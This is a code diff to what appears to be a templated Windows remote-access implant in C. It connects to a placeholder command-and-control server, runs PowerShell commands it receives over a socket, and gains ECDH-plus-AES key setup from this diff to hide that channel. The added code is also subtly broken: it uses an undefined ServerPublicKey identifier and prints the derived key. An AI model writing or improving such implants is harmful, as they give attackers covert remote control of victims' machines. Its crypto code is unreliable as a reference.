@@ -3,10 +3,17 @@
 #include <stdio.h>
 #include <string.h>
 
+#include <openssl/ec.h>
+#include <openssl/pem.h>
+#include <openssl/sha.h>
+#include <openssl/aes.h>
+#include <arpa/inet.h>
+
 #pragma comment(lib, "ws2_32.lib")
 
 #define SERVER_IP "{{.IP_SERVER}}"
 #define SERVER_PORT {{.PORT_SERVER}}
+#define SERVER_PUBKEY "{{.ServerPublicKey}}"
 #define TIMEOUT_MS 10000
 #define BUFFER_SIZE 4096
 
@@ -129,6 +136,7 @@ void run_powershell_command(SOCKET sock, const char* cmdID, const char* command)
 }
 
 int main() {
+
     // Windows socket init
     WSADATA wsa;
     SOCKET sock;
@@ -151,6 +159,42 @@ int main() {
         WSACleanup();
         return 1;
     }
+
+    //-------------------------ENCRYPTION PART
+    // Generate EC pair
+    EC_KEY *client_key = EC_KEY_new_by_curve_name(NID_X9_62_prime256v1);
+    EC_KEY_generate_key(client_key);
+
+    // Get public key
+    BIO *bio = BIO_new(BIO_s_mem());
+    PEM_write_bio_EC_PUBKEY(bio, client_key);
+    char pubkey[512];
+    int len = BIO_read(bio, pubkey, sizeof(pubkey));
+
+    // Send public key to server
+    send(sock, pubkey, len, 0);
+
+    // Server public key
+    BIO *bio_srv = BIO_new_mem_buf(ServerPublicKey, sizeof(ServerPublicKey));
+    EC_KEY *server_key = PEM_read_bio_EC_PUBKEY(bio_srv, NULL, NULL, NULL);
+
+    // Compute shared secret
+    const EC_POINT *srv_point = EC_KEY_get0_public_key(server_key);
+    const EC_GROUP *group = EC_KEY_get0_group(client_key);
+    unsigned char secret[32];
+    ECDH_compute_key(secret, sizeof(secret), srv_point, client_key, NULL);
+
+    // AES key derivated
+    unsigned char aes_key[32];
+    SHA256(secret, sizeof(secret), aes_key);
+
+    printf("AES shared key : ");
+    for (int i = 0; i < 32; i++) printf("%02x", aes_key[i]);
+    printf("\n");
+
+
+    //--------------------------
+
 
     // ID du client
     char* clientID = "{{.ID}}\n";
